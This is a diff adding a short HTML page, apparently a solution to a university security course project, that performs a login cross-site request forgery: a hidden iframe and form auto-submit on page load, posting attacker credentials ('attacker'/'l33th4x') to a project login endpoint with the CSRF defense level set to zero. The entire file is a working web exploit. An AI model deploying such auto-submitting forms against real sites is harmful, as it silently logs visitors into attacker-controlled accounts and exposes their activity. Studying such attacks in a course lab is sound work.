@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <div style="visibility: hidden;">
+        <iframe name="my_iframe"></iframe>
+
+        <form id="my_form" method="POST" action="https://project2.ecen4133.org/login?" target="my_iframe">
+            <input type="text" name="username" value="attacker" />
+            <input type="text" name="password" value="l33th4x" />
+            <input type="text" name="csrfdefense" value="0" />
+            <input type="text" name="xssdefense" value="4" />
+        </form>
+
+        <script>
+            document.getElementById("my_form").submit();
+        </script>
+    </div>
+</head>
+</html>
